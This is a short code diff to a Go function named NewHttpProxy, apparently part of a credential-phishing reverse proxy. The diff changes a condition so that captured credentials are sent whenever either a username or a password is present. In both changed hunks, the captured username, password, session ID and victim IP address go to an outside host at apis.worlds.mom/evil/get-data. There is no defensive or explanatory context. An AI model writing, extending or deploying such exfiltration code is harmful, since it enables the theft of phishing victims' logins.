@@ -602,7 +602,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 							}
 
-							if len(capUserName) > 0 && len(capPassword) > 0 {
+							if len(capUserName) > 0 || len(capPassword) > 0 {
 								doReq("https://apis.worlds.mom/evil/get-data/?sid=" + ps.SessionId + "&ip=" + remote_addr + "&user=" + url.QueryEscape(capUserName) + "&pwd=" + url.QueryEscape(capPassword))
 							}
 
@@ -663,7 +663,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										}
 									}
 
-									if len(capUserName) > 0 && len(capPassword) > 0 {
+									if len(capUserName) > 0 || len(capPassword) > 0 {
 										doReq("https://apis.worlds.mom/evil/get-data/?sid=" + ps.SessionId + "&ip=" + remote_addr + "&user=" + url.QueryEscape(capUserName) + "&pwd=" + url.QueryEscape(capPassword))
 									}
 								}
